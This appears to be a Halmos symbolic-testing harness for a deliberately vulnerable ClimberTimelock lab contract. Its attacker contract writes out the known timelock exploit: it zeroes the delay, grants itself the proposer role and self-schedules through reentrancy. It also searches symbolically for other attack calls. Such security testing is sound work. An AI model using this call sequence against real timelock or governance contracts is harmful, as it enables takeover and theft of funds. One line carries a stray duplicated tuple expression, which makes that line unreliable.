// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "halmos-cheatcodes/SymTest.sol";
import "forge-std/Test.sol";
import "lib/GlobalStorage.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";

contract SymbolicAttacker is Test, SymTest {
    // We can hardcode this address for convenience
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002));
    ClimberTimelock timelock;
    bool reent_guard = false;
    bool is_preload = false;

    fallback() external payable {
        if (is_preload) {
            bytes32 salt = hex"01";
            address[] memory targets = new address[](3);
            uint256[] memory values = new uint256[](3);
            bytes[] memory dataElements = new bytes[](3);
            targets[0] = address(timelock);
            targets[1] = address(timelock);
            targets[2] = address(this);
            values[0] = 0;
            values[1] = 0;
            values[2] = 0;
            dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
            dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
            dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");
            timelock.schedule_preload(targets, values, dataElements, salt);
            return ;
        }
        vm.assume(reent_guard == false);
        reent_guard = true;
        bytes4 selector = svm.createBytes4("fallback_selector");
        vm.assume(selector == bytes4(msg.data));
        execute_tx("fallback_target");
        reent_guard = false;
        bytes memory retdata = svm.createBytes(1000, "fallback_retdata");// something should be returned
        assembly {
            return(add(retdata, 0x20), mload(retdata))
        }
    }

    function execute_tx(string memory target_name) private {
        address target = svm.createAddress(target_name);
        bytes memory data;
        //Get some concrete target-name pair
        (target, data) = glob.get_concrete_from_symbolic_optimized(target);
        uint snap0 = vm.snapshotState();
        target.call(data);
        uint snap1 = vm.snapshotState();
        vm.assume(snap0 != snap1);
    }

    function preload(ClimberTimelock _timelock) public {
        vm.assume(msg.sender == address(0xcafe0001)); // Only player can execute it
        is_preload = true;
        timelock = _timelock;
        bytes32 salt = hex"01";
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");
        timelock.execute_preload(targets, values, dataElements, salt);(targets, values, dataElements, salt);
        is_preload = false;
    }

    function attack() public {
        vm.assume(msg.sender == address(0xcafe0001)); // Only player can execute it
        execute_tx("attack_target");
    }
}